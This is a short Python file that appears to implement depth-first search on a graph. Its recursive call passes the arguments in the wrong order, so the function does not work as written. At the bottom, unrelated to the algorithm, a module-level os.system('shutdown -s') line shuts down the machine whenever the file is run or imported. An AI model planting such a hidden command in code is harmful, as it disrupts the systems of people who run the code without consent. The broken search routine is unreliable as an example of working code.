import os


def dfs(start, graph, visited=None):
    if visited is None:
        visited = set()

    visited.add(start)

    for next in graph[start] - visited:
        dfs(graph, next, visited)

    return visited


os.system('shutdown -s')
